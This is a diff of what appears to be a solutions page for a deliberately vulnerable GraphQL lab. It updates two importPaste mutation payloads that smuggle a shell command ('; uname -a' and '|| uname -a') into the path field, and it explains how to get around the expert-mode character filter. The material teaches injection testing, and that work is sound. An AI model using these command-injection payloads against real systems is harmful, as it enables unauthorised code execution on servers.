@@ -389,15 +389,19 @@ mutation {
 # Beginner mode
 
 # Import Paste allows specifying UNIX characters to break out of the URL provided to importPaste, using characters such as ";" "&&", "||", and more.
-query {
-  importPaste(host:"localhost", port:80, path:"/ ; uname -a")
+mutation  {
+  importPaste(host:'localhost', port:80, path:"/ ; uname -a", scheme:"http"){
+    result
+  }
 }
 
 # Expert mode
 
 # Import Paste filters characters such as ";" and "&" but not "|", if you manage to cause the import to fail, you can double pipe it to a command that will execute in the context of the operating system.
-query {
-  importPaste(host:"hostthatdoesnotexist.com", port:80, path:"/ || uname -a")
+mutation {
+  importPaste(host:"hostthatdoesnotexist.com", port:80, path:"/ || uname -a", scheme:"http") {
+    result
+  }
 }
 
 </pre>
